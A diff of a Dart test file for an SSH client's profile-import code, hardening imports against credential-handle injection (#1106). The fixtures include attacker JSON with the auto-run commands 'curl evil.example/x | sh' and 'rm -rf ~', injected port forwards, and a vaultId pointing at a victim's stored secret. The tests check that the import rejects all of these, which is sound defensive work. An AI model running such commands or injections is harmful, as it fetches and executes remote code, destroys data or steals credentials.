@@ -251,13 +251,16 @@ void main() {
       expect(result.errors.first, contains('Unsupported export version'));
     });
 
-    // #961 (regression guard): a key-auth profile imported via the plain
-    // (no-vault) path must retain authType='key' + keyVaultId, not silently
-    // become password-only. Mirrors the existing theme/color upsert test but
-    // for the auth-TYPE + key reference. Device report showed
-    // `withAuthType=0 withKeyVaultId=0` after import — this pins the fix.
-    test('key-auth profile imported into a fresh store keeps authType/keyVaultId '
-        '(#961)', () async {
+    // #961 (regression guard) + #1106 (security hardening): a key-auth profile
+    // imported via the plain (no-vault) path must retain authType='key' — not
+    // silently become password-only (the original #961 device bug:
+    // `withAuthType=0`). But the credential HANDLES (vaultId/keyVaultId) must
+    // NOT survive the plain path: they name secrets that did NOT travel with
+    // the import, so trusting them lets a crafted import dereference some other
+    // host's stored secret (#1106). The handles are dropped; the profile
+    // prompts for its key on first connect.
+    test('key-auth profile imported into a fresh store keeps authType but drops '
+        'unbacked credential handles (#961, #1106)', () async {
       final store = ProfilesStore();
       const keyAuthExport = '''
 {
@@ -281,16 +284,20 @@ void main() {
 
       final loaded = await store.load();
       expect(loaded, hasLength(1));
-      expect(loaded.single.authType, 'key');
-      expect(loaded.single.vaultId, 'v-key');
-      expect(loaded.single.keyVaultId, 'k-key');
+      expect(loaded.single.authType, 'key', reason: 'not password-only (#961)');
+      expect(loaded.single.vaultId, isNull,
+          reason: 'unbacked handle dropped (#1106)');
+      expect(loaded.single.keyVaultId, isNull,
+          reason: 'unbacked handle dropped (#1106)');
     });
 
-    test('re-import upserts authType/keyVaultId onto an existing identity-only '
-        'profile via the plain path (#961)', () async {
-      // The device-confirmed shape: an older identity-only profile already
-      // exists; re-importing the same identity with key auth must UPGRADE it
-      // in place (not leave it password-only).
+    test('plain re-import over an existing identity-only profile NEVER installs '
+        'credential handles onto it (#961, #1106)', () async {
+      // #961 wanted a re-import to upgrade a stale identity-only profile. But a
+      // plain (no-vault) import carries no accompanying secret, so installing
+      // its handles onto the existing profile is exactly the #1106 injection
+      // vector (a crafted import matching the identity would bind it to some
+      // other host's stored secret). The existing local profile is left intact.
       final store = ProfilesStore();
       await store.save(<SavedProfile>[
         SavedProfile(
@@ -321,9 +328,10 @@ void main() {
       expect(loaded, hasLength(1));
       final upserted = loaded.single;
       expect(upserted.title, 'Old Box', reason: 'user title not clobbered');
-      expect(upserted.authType, 'key');
-      expect(upserted.vaultId, 'v-key');
-      expect(upserted.keyVaultId, 'k-key');
+      expect(upserted.vaultId, isNull,
+          reason: 'plain import never installs a handle onto existing (#1106)');
+      expect(upserted.keyVaultId, isNull,
+          reason: 'plain import never installs a handle onto existing (#1106)');
     });
   });
 
@@ -380,12 +388,13 @@ void main() {
       expect(loaded.single.host, 'ok.example');
     });
 
-    test('ignores plaintext credentials silently — only vaultId is kept',
+    test('ignores plaintext credentials AND drops unbacked vaultId (#1106)',
         () async {
-      // Belt-and-braces: even if the PWA export had credentials, the
-      // SavedProfile.fromJson factory would not read them and they would
-      // never reach storage. (vaultId IS preserved as of #510 because it's
-      // a reference, not a secret.)
+      // Plaintext credentials never reach storage (SavedProfile.fromJson does
+      // not read them). As of #1106 the vaultId reference is ALSO dropped on
+      // the plain path — it names a secret that did not travel with the import,
+      // so keeping it would let the profile dereference some other host's
+      // stored secret.
       final store = ProfilesStore();
       const sneaky = '''
 {
@@ -405,7 +414,8 @@ void main() {
       final stored = loaded.single.toJson();
       expect(stored.containsKey('password'), isFalse);
       expect(stored.containsKey('privateKey'), isFalse);
-      expect(stored['vaultId'], 'v-keep');
+      expect(stored['vaultId'], isNull,
+          reason: 'unbacked handle dropped on the plain path (#1106)');
     });
   });
 
@@ -689,6 +699,155 @@ void main() {
       expect(await store.load(), isEmpty);
       // No secret persisted.
       expect(await secrets.read('v-x'), isNull);
+    });
+  });
+
+  group('ProfilesStore import — credential-theft hardening (#1106)', () {
+    test('imported vaultId naming a DIFFERENT host\'s stored secret resolves no '
+        'credential', () async {
+      // Victim: a real local password profile whose secret lives at the
+      // predictable id `profile-victim.example:22:victim`.
+      final secrets = SecretsStore(backend: InMemorySecretsBackend());
+      const victimVaultId = 'profile-victim.example:22:victim';
+      await secrets.write(victimVaultId, <String, Object?>{
+        'password': 'victim-password',
+      });
+
+      final store = ProfilesStore();
+      await store.save(<SavedProfile>[
+        SavedProfile(
+          title: 'Victim', host: 'victim.example', port: 22,
+          username: 'victim', authType: 'password', vaultId: victimVaultId,
+        ),
+      ]);
+
+      // Attacker imports a profile pointing at their OWN host but naming the
+      // victim's vaultId — a plain (no-vault) import.
+      final attackerImport = '''
+{
+  "version": 1,
+  "profiles": [
+    {
+      "title": "Free Shell",
+      "host": "attacker.example",
+      "port": 22,
+      "username": "root",
+      "authType": "password",
+      "vaultId": "$victimVaultId"
+    }
+  ]
+}
+''';
+      final result = await store.importFromJson(attackerImport);
+      expect(result.added, 1);
+
+      final loaded = await store.load();
+      final attackerProfile =
+          loaded.firstWhere((p) => p.host == 'attacker.example');
+      // The handle was stripped: no dereference to the victim's secret.
+      expect(attackerProfile.vaultId, isNull);
+      final creds = await loadProfileCredentials(secrets, attackerProfile);
+      expect(creds.password, isNull,
+          reason: 'must not resolve the victim\'s stored password');
+      expect(creds.privateKey, isNull);
+
+      // The victim profile is untouched.
+      final victim = loaded.firstWhere((p) => p.host == 'victim.example');
+      expect(victim.vaultId, victimVaultId);
+    });
+
+    test('imported initialCommand and forwards are NOT installed', () async {
+      final store = ProfilesStore();
+      const evil = '''
+{
+  "version": 1,
+  "profiles": [
+    {
+      "title": "Payload",
+      "host": "attacker.example",
+      "port": 22,
+      "username": "root",
+      "initialCommand": "curl evil.example/x | sh",
+      "forwards": [
+        { "localPort": 8080, "remoteHost": "10.0.0.1", "remotePort": 80 }
+      ]
+    }
+  ]
+}
+''';
+      final result = await store.importFromJson(evil);
+      expect(result.added, 1);
+
+      final loaded = await store.load();
+      final p = loaded.single;
+      expect(p.initialCommand, isNull,
+          reason: 'import must not arm an auto-run command');
+      expect(p.forwards, isEmpty,
+          reason: 'import must not arm auto-connected port forwards');
+    });
+
+    test('collision with an existing LOCAL profile preserves its credentials, '
+        'command and forwards', () async {
+      final store = ProfilesStore();
+      await store.save(<SavedProfile>[
+        SavedProfile(
+          title: 'My Server',
+          host: 'mine.example',
+          port: 22,
+          username: 'me',
+          authType: 'key',
+          vaultId: 'my-real-vault',
+          keyVaultId: 'my-real-key',
+          initialCommand: 'tmux attach',
+          forwards: const [
+            ProfileForward(localPort: 5900, remoteHost: '127.0.0.1',
+                remotePort: 5900),
+          ],
+        ),
+      ]);
+
+      // A plain import colliding on the same identity, trying to overwrite the
+      // credential bundle and inject a command / forward.
+      const colliding = '''
+{
+  "version": 1,
+  "profiles": [
+    {
+      "title": "Imported name",
+      "host": "mine.example",
+      "port": 22,
+      "username": "me",
+      "theme": "nord",
+      "authType": "password",
+      "vaultId": "attacker-vault",
+      "keyVaultId": "attacker-key",
+      "initialCommand": "rm -rf ~",
+      "forwards": [
+        { "localPort": 1, "remoteHost": "10.0.0.1", "remotePort": 1 }
+      ]
+    }
+  ]
+}
+''';
+      final result = await store.importFromJson(colliding);
+      expect(result.updated, 1);
+      expect(result.added, 0);
+
+      final loaded = await store.load();
+      final p = loaded.single;
+      // The whole credential bundle (authType + handles) and auto-run config
+      // are frozen against the untrusted import: the profile still resolves ITS
+      // OWN stored secret in its OWN mode and will not run an injected command
+      // / forward.
+      expect(p.authType, 'key');
+      expect(p.vaultId, 'my-real-vault');
+      expect(p.keyVaultId, 'my-real-key');
+      expect(p.initialCommand, 'tmux attach');
+      expect(p.forwards, hasLength(1));
+      expect(p.forwards.single.localPort, 5900);
+      expect(p.title, 'My Server', reason: 'user title not clobbered');
+      // Non-secret display metadata IS refreshed.
+      expect(p.theme, 'nord');
     });
   });
 }
